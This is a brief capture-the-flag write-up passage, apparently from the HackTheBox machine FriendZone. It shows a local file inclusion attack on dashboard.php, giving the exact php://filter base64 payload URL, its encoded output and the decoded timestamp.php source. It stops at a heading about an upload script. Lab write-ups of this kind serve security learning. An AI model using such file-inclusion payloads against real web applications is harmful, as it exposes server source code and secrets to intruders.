# lfi vuln on dashboard.php
## php://filter/convert.base64-encode/resource=timestamp

```
https://administrator1.friendzone.red/dashboard.php?image_id=e.gif&pagename=php://filter/convert.base64-encode/resource=timestamp
```

- This encodes the php in base64 not allowing it to be execused and instead be written out on the webpage which we can copy and decode from our pc

```
PD9waHAKCgokdGltZV9maW5hbCA9IHRpbWUoKSArIDM2MDA7CgplY2hvICJGaW5hbCBBY2Nlc3MgdGltZXN0YW1wIGlzICR0aW1lX2ZpbmFsIjsKCgo/Pgo=
```
- Returns
Timestamp.php
```
<?php


$time_final = time() + 3600;

echo "Final Access timestamp is $time_final";


?>

```
## ../uploads/upload 
### Here we can see the upload script 
